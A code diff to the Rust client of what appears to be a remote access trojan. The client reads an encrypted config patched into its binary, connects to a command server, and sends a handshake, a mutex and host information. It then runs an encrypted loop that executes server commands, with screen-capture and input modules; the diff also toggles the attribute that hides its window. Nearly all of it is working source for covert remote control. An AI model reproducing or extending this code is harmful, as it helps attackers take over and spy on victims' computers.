@@ -1,4 +1,4 @@
-#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
+//#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 ///////////////////////////////////////////////////////////////////
 // server patches config into this area
 #[used]
@@ -21,11 +21,11 @@ use shared::crypto::Encryption;
 use shared::types::ClientConfig;
 use smol::channel;
 use smol::{
-    //Executor,
-    io::{AsyncReadExt, AsyncWriteExt},
+    io::{self, AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt},
+    lock::Mutex,
     net::TcpStream,
 };
-use winapi::um::winuser::{MessageBoxW, MB_ICONERROR, MB_OKCANCEL};
+use winapi::um::winuser::{MB_ICONERROR, MB_OKCANCEL, MessageBoxW};
 
 use crate::commands::computer_info;
 use crate::threading::ActiveCommands;
@@ -33,6 +33,7 @@ use crate::threading::ActiveCommands;
 mod capture;
 mod commands;
 mod handler;
+mod input;
 mod threading;
 
 pub fn wstring(s: &str) -> Vec<u16> {
@@ -49,7 +50,12 @@ fn config() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
         let length = std::ptr::read_volatile(length_ptr).to_le() as usize;
 
         if length == 0 || length > 4092 {
-            MessageBoxW(null_mut(), wstring("Failed to read config!").as_ptr(), wstring("Error").as_ptr(), MB_OKCANCEL | MB_ICONERROR);
+            MessageBoxW(
+                null_mut(),
+                wstring("Failed to read config!").as_ptr(),
+                wstring("Error").as_ptr(),
+                MB_OKCANCEL | MB_ICONERROR,
+            );
             return Err("Failed to read config!".into());
         }
         //////////////////////////////////////////////////
@@ -76,14 +82,13 @@ fn decrypt(
         .decrypt(nonce, ciphertext)
         .map_err(|e| e.to_string())
         .unwrap();
-    //let config_string = String::from_utf8(config)?;
 
     let (client_config, _length): (ClientConfig, usize) =
         bincode::decode_from_slice(&config, bincode::config::standard())?;
 
-    //println!("[✓] Decrypted config:\n    {}", &config_string);
     Ok((client_config, key))
 }
+
 /////////////////////////
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let config_buffer = config()?;
@@ -91,34 +96,41 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     let socket = format!("{0}:{1}", &config.address, &config.port);
 
     smol::block_on(async move {
-        // let executor = Executor::new(); // create an executor to spawn tasks
-        // like so: executor.spawn(async {});
-        let mut stream = TcpStream::connect(socket).await?;
+        let stream = TcpStream::connect(socket).await?;
+        let (mut reader, writer) = io::split(stream);
+        let writer = Arc::new(Mutex::new(writer));
 
         println!("[*][main] sending handshake");
-        stream.write_all(&[0x0a, 0xee, 0x7c, 0x9b, 0x32]).await?;
+        writer
+            .lock()
+            .await
+            .write_all(&[0x0a, 0xee, 0x7c, 0x9b, 0x32])
+            .await?;
         println!("[*][main] waiting for response");
         let mut response = [0; 5];
-        stream.read_exact(&mut response).await?;
+        reader.read_exact(&mut response).await?;
 
         if response == [0x32, 0x9b, 0x7c, 0xee, 0x0a] {
             println!("[v][main] handshake successful; sending mutex");
-            stream.write_all(config.mutex.as_slice()).await?;
+            writer
+                .lock()
+                .await
+                .write_all(config.mutex.as_slice())
+                .await?;
         } else {
             println!("[x][main] handshake failed");
-            return Err("Failed handshake with server".into()); // drop out
+            return Err("Failed handshake with server".into());
         }
 
         let encryption = Encryption::new(_key);
 
-        // send computer info before anything happen
         if let Ok(res) = computer_info::main() {
             let computer_info_payload = BaseResponse {
                 id: 0,
                 response: res,
             };
             let _ = send(
-                &mut stream,
+                &mut *writer.lock().await,
                 &encryption,
                 bincode::encode_to_vec(computer_info_payload, bincode::config::standard()).unwrap(),
             )
@@ -127,15 +139,10 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             println!("[x][main] failed to run computer_info::main");
         }
 
-        match wait(stream, encryption).await {
-            Ok(_) => {
-                println!("[*][main] loop exited gracefully");
-            }
-            Err(e) => {
-                println!("[x][main] error waiting for response: {}", e);
-                // return Err(e);
-            }
-        }; // nice little command loop
+        match wait(reader, writer, encryption).await {
+            Ok(_) => println!("[*][main] loop exited gracefully"),
+            Err(e) => println!("[x][main] error waiting for response: {}", e),
+        };
 
         println!("[v][main] closing");
         Ok(())
@@ -143,7 +150,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 async fn send(
-    stream: &mut TcpStream,
+    stream: &mut (impl AsyncWrite + Unpin + Send + 'static),
     encryption: &Encryption,
     buf: Vec<u8>,
 ) -> Result<(), std::io::Error> {
@@ -152,35 +159,34 @@ async fn send(
         payload.extend_from_slice(&nonce);
         payload.extend_from_slice(&encrypted);
 
-        let _ = shared::net::write(stream, &payload).await;
-        println!("[v][send] wrote payload (size:{}) to server", &buf.len());
-        return Ok(());
-    } else {
-        println!("[x][send] failed to write to server");
-        return Err(std::io::Error::new(
-            std::io::ErrorKind::BrokenPipe,
-            "Failed to write to server",
-        ));
+        shared::net::write(stream, &payload).await?;
+        // println!("[v][send] wrote payload (size:{}) to server", &buf.len());
     }
+    Ok(())
 }
 
-async fn wait(mut stream: TcpStream, encryption: Encryption) -> Result<(), std::io::Error> {
+async fn wait(
+    mut reader: impl AsyncRead + Unpin + Send + 'static,
+    writer: Arc<Mutex<impl AsyncWrite + Unpin + Send + 'static>>,
+    encryption: Encryption,
+) -> Result<(), std::io::Error> {
     println!("[*][wait] entered loop");
 
-    // Create a channel for sending responses back
     let (response_tx, response_rx) = channel::unbounded();
-
-    let active = ActiveCommands::new();
-
-    // Wrap encryption in Arc for shared ownership
+    let mut active = ActiveCommands::new();
     let encryption = Arc::new(encryption);
 
-    // Spawn a task to handle sending responses
-    let mut stream_writer = stream.clone();
+    let stream_writer = writer.clone();
     let encryption_writer = encryption.clone();
     smol::spawn(async move {
         while let Ok(response_data) = response_rx.recv().await {
-            if let Err(e) = send(&mut stream_writer, &encryption_writer, response_data).await {
+            if let Err(e) = send(
+                &mut *stream_writer.lock().await,
+                &encryption_writer,
+                response_data,
+            )
+            .await
+            {
                 println!("[x][wait] failed to send response: {}", e);
                 break;
             }
@@ -189,23 +195,20 @@ async fn wait(mut stream: TcpStream, encryption: Encryption) -> Result<(), std::
     .detach();
 
     loop {
-        match shared::net::read(&mut stream).await {
+        match shared::net::read(&mut reader).await {
             Ok(buf) => {
-                println!("[*][wait] reading data from server");
+                // println!("[*][wait] reading data from server");
                 let mut nonce = [0u8; 12];
                 nonce.copy_from_slice(&buf[..12]);
                 let buffer = &buf[12..];
                 if let Ok(decrypted) = encryption.decrypt(&nonce, buffer) {
-                    println!("[v][wait] decrypted payload (size:{})", &decrypted.len());
+                    // println!("[v][wait] decrypted payload (size:{})", &decrypted.len());
 
                     let (command, _size): (BaseCommand, usize) =
                         bincode::decode_from_slice(&decrypted, bincode::config::standard())
                             .unwrap();
 
-                    // Clone the sender for the spawned task
                     let response_tx = response_tx.clone();
-
-                    // Spawn the command handling in a new task
                     active.spawn(command, response_tx).await;
                 } else {
                     println!("[x][wait] decryption failed");
@@ -213,7 +216,9 @@ async fn wait(mut stream: TcpStream, encryption: Encryption) -> Result<(), std::
             }
             Err(e) => {
                 println!("[x][wait] {}", e);
-                break Ok(());
+                if e.kind() != std::io::ErrorKind::FileTooLarge {
+                    break Ok(());
+                }
             }
         };
     }
